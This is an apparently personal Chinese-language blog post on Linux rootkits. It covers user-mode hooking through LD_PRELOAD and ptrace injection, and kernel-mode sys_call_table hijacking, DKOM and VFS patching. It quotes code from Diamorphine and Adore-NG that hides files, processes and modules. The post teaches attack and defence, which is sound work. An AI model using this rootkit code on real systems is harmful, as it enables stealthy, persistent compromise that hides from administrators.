---
layout:     post
title:      Linux 安全对抗收集（rootkit篇）
subtitle:   rootkit 介绍及攻防原理（持续更新）
date:       2025-05-06
author:     pandaychen
header-img:
catalog: true
tags:
    - Linux
    - rootkit
---

##  0x00    前言
本文对rootkit进行一些原理上的整理

##  0x01    rootkit基础概念
rootkit是一种恶意程序，能够隐藏自身及相关活动（如模块、进程、文件、网络连接等），用以规避安全检测工具。一般分为用户态、内核态rootkit两种：

-   用户态rootkit：运行在用户空间，通过劫持库函数或注入进程实现隐藏
-   内核态rootkit：运行在内核空间，修改内核数据结构或代码，隐蔽性较高，常见基于LKM、eBPF技术实现

一般认为rootkit的特点有：

-   隐藏进程：修改进程链表或系统调用结果，隐藏恶意进程
-   隐藏文件：篡改文件系统接口，隐藏恶意文件
-   隐藏网络连接：伪造网络状态，隐藏恶意流量
-   提权后门：提供持久化高权限访问
-   数据窃取：窃取敏感信息，传输至C2服务器
-   自我保护：通过反调试技术阻止分析

##  0x02    用户态rootkit
用户态rootkit运行在用户空间，部署简单但隐蔽性较低

####    LD_PRELOAD劫持
通过设置`LD_PRELOAD`加载自定义动态库，覆盖标准库函数。例如，劫持`readdir`隐藏特定文件或目录：

```cpp
struct dirent *readdir(DIR *dir) {
    static struct dirent *(*real_readdir)(DIR *) = NULL;
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    struct dirent *entry = real_readdir(dir);
    while (entry && strstr(entry->d_name, "malicious")) {
        entry = real_readdir(dir); // skip malicious filename
    }
    return entry;
}
```

原理是通过设置`LD_PRELOAD`环境变量加载恶意共享库，覆盖标准库函数。技术上，`LD_PRELOAD`利用Linux动态链接器的优先加载机制，将恶意函数置于标准库之前

####    进程注入
通过将恶意代码注入合法进程（如`systemd`）用以隐藏行为。例如使用`ptrace`注入代码：

```cpp
void inject_code(pid_t pid, unsigned char *code, size_t len) {
    //1、首先通过mmap分配一块可读、可写、可执行的内存，将shellcode复制进去
    void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap error");
        return;
    }
    memcpy(mem, code, len);

    //2、使用ptrace的PTRACE_ATTACH附加到目标进程，获取其寄存器状态（struct user_regs_struct），修改指令指针rip指向注入的代码
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace error");
        return;
    }

    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    regs.rip = (unsigned long)mem;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    //3、分离进程让其执行恶意代码
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

unsigned char sample_code[] = {
    // put your shellcode
    // 如[Linux process injection](https://github.com/W3ndige/linux-process-injection?tab=readme-ov-file)
    // 通过此shellcode可以实现system("/bin/sh")的功能
};

int main() {
    pid_t target_pid = 1234; // 目标进程
    inject_code(target_pid, sample_code, sizeof(sample_code));
    return 0;
}
```

它的原理是利用`ptrace`将恶意shellcode注入合法进程的内存空间，代码运行于内存，无需磁盘文件，隐蔽性高于`LD_PRELOAD`

##  0x03    内核态rootkit
内核态rootkit运行在Ring 0，控制系统资源且隐蔽性极高

####    系统调用表劫持
通过修改`sys_call_table`替换系统调用函数。[`sys_call_table`机制](https://pandaychen.github.io/2025/03/01/A-LINUX-KERNEL-TRAVEL-7/#kallsyms)，如替换`sys_getdents`隐藏文件的代码，一般采用LKM技术实现（LKM是唯一支持运行时动态修改内核系统调用表的实用方案）

```cpp
asmlinkage long (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int);
asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    long ret = orig_getdents(fd, dirp, count);
    struct linux_dirent *d;
    int offset = 0;
    for (offset = 0; offset < ret; ) {
        d = (struct linux_dirent *)(dirp + offset);
        if (strstr(d->d_name, "malicious")) {
            memmove(d, d + d->d_reclen, ret - offset - d->d_reclen);
            ret -= d->d_reclen;
        } else {
            offset += d->d_reclen;
        }
    }
    return ret;
}

static int __init rootkit_init(void) {
    orig_getdents = sys_call_table[__NR_getdents];
    disable_write_protection();
    // 修改sys_call_table 指针数组
    sys_call_table[__NR_getdents] = hooked_getdents;
    enable_write_protection();
    return 0;
}
```

该攻击（系统调用表劫持）的原理是，通过修改`sys_call_table`替换关键系统调用（如`sys_getdents`），用于隐藏文件（ext4-VFS）或者进程（基于`procs`文件系统）。实现上，rootkit需要定位到`sys_call_table`的地址（可通过`kallsyms`或硬编码偏移），然后替换目标函数指针指向恶意hook实现

####    DKOM：直接内核对象操作
直接内核对象操作（Direct Kernel Object Manipulation），通过直接篡改内核内存中的关键数据结构（如进程、文件对象、网络连接表）实现恶意功能的隐藏，无需依赖传统的hook技术，其核心优势在于极高的隐蔽性，缺点是开发复杂且易引发系统崩溃

由于DKOM 技术核心是直接操作内核对象的内存内容，一般可实现如下功能：
-   隐藏进程：移除`task_struct`中的进程链表节点（tasks双向链表），使`ps`、`/proc`等无法枚举恶意进程
-   隐藏文件：篡改文件系统对象（如`dentry`），从目录项链表中删除恶意文件节点，导致`ls`或文件系统扫描跳过该文件
-   提权：修改进程凭证（如`cred`结构体），将普通进程的`UID`/`GID`替换为`0`（即拿到了`root`权限）
-   无钩子痕迹：不同于系统调用表劫持或函数钩子，DKOM技术不修改代码指针，仅篡改数据，规避了基于代码完整性扫描的检测

介绍两个典型 DKOM rootkit 案例

1、[Diamorphine](https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c)

-   进程隐藏：从`init_task`链表中移除目标进程的`task_struct`节点
-   模块隐藏：将自身LKM从内核模块链表（`modules`）中移除，规避`lsmod`检测

```cpp
void
// 模块隐藏，在初始化时移除链表节点
// 在模块加载函数 diamorphine_init() 中，调用 list_del() 将自身从链表中摘除
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);    // 删除当前模块的链表节点
	module_hidden = 1;
}

// 进程隐藏
struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}
```

2、[Adore-NG](https://github.com/yaoyumeng/adore-ng/)

-   [文件隐藏]()：通过修改VFS中的`file_operations`的实现来完成的，主要是`f_op->readdir`、`f_op->iterate`这两个方法
-   [进程隐藏](https://github.com/yaoyumeng/adore-ng/blob/master/adore-ng.c#L193)：同上，也通过修改VFS的`procfs`类型的上述方法来实现

```cpp
/*
patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);
patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);
patch_vfs(proc_fs, &orig_proc_iterate, adore_proc_iterate);
patch_vfs(root_fs, &orig_root_iterate, adore_root_iterate);
*/
int patch_vfs(const char *p, 
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
			readdir_t *orig_readdir, readdir_t new_readdir
#else
			iterate_dir_t *orig_iterate, iterate_dir_t new_iterate
#endif
			)
{
	struct file_operations *new_op;
	struct file *filep;

	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
        return -1;
	}
	
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
	if (orig_readdir)
        //保存原始vfs的实现
		*orig_readdir = filep->f_op->readdir;
#else
	if (orig_iterate)
        //保存原始vfs的实现
		*orig_iterate = filep->f_op->iterate;
#endif

	new_op = (struct file_operations *)filep->f_op;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
	new_op->readdir = new_readdir;  //替换掉系统的readdir实现
#else
	new_op->iterate = new_iterate;  //替换掉系统的iterate实现
	printk("patch starting, %p --> %p\n", *orig_iterate, new_iterate);
#endif

    // 将filep对象的f_op改为adore的实现
	filep->f_op = new_op;
	filp_close(filep, 0);
	return 0;
}
```

其中上面代码中的`new_readdir`、`new_iterate`对应于下面的实现：

-   `adore_proc_readdir`：针对procfs的`readdir`实现，代码如下
-   `adore_root_readdir`
-   `adore_proc_iterate`
-   `adore_root_iterate`

```cpp
int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	spin_lock(&proc_filldir_lock);
    //proc_filldir是一个全局变量
	proc_filldir = filldir;
    // orig_proc_readdir也是全局变量，保存了原始vfs的readdir实现（*orig_readdir = filep->f_op->readdir;）
	r = orig_proc_readdir(fp, buf, adore_proc_filldir/*funcptr*/);
	spin_unlock(&proc_filldir_lock);
	return r;
}

int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
{
	char abuf[128];

	memset(abuf, 0, sizeof(abuf));
	memcpy(abuf, name, nlen < sizeof(abuf) ? nlen : sizeof(abuf) - 1);

	if (should_be_hidden(adore_atoi(abuf)))
		return 0;

	if (proc_filldir)
		return proc_filldir(buf, name, nlen, off, ino, x);
	return 0;
}
```


####    内核模块加载
大部分内核rootkit都是以可加载内核模块（LKM）形式运行，注册恶意逻辑，如下面的代码，其工作原理是通过LKM加载rootkit，隐藏自身模块，调用`hide_process`隐藏进程

```cpp
static int __init rootkit_init(void) {
    printk(KERN_INFO "rootkit mount\n");
    hide_process(1234); // 隐藏PID 1234
    list_del(&THIS_MODULE->list); // 隐藏模块
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "rootkit unmount\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
```

##  0x0B  参考
-   [Linux中基于eBPF的恶意利用与检测机制](https://www.cnxct.com/evil-use-ebpf-and-how-to-detect-ebpf-rootkit-in-linux/)
-   [通过chkrootkit学习如何在linux下检测RootKit](https://www.giantbranch.cn/2018/10/09/通过chkrootkit学习如何在linux下检测RootKit/)
-   [LKM Linux rootkit](https://github.com/f0rb1dd3n/Reptile)
-   [检测Linux rootkit入侵威胁](https://help.aliyun.com/zh/security-center/user-guide/detect-linux-rootkit-intrusions)
-   [Diamorphine](https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c)
-   [隐匿与追踪：rootkit检测与绕过技术分析](https://tiangonglab.github.io/blog/tiangongarticle73/)
-   [Linux rootkit 深度分析：可加载内核模块](https://zhuanlan.zhihu.com/p/666203507)
-   [Linux process injection](https://github.com/W3ndige/linux-process-injection?tab=readme-ov-file)
-   [Linux rootkit Sample && rootkit Defenser Analysis](https://www.cnblogs.com/LittleHann/p/3879961.html)